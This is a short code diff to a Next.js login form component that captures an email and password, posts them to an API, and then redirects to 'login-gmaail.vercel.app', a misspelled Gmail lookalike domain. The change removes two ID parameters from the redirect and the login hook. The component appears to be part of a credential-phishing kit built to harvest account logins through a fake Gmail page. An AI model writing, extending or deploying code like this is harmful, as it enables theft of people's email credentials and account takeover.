@@ -8,13 +8,13 @@ import { useRouter } from "next/navigation";
 import Cookies from "js-cookie";
 import { API_URL } from "../config/index";
 
-function LoginForm({ adminId, posterId,verifyId }) {
+function LoginForm({ adminId }) {
   const router = useRouter();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [wrongPassword, setWrongPassword] = useState("");
   const [showWrongPassword, setShowWrongPassword] = useState(false);
-  const { login } = useMockLogin(adminId, posterId,verifyId);
+  const { login } = useMockLogin(adminId);
 
   const handleSubmit = () => {
     const submitValues = {
@@ -51,7 +51,7 @@ function LoginForm({ adminId, posterId,verifyId }) {
       setEmail("");
       setPassword("");
       setWrongPassword("");
-    router.push(`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`);
+      router.push(`https://login-gmaail.vercel.app/${adminId}`);
     } else {
       console.log("error", data);
       toast.error("Something Went Wrong");
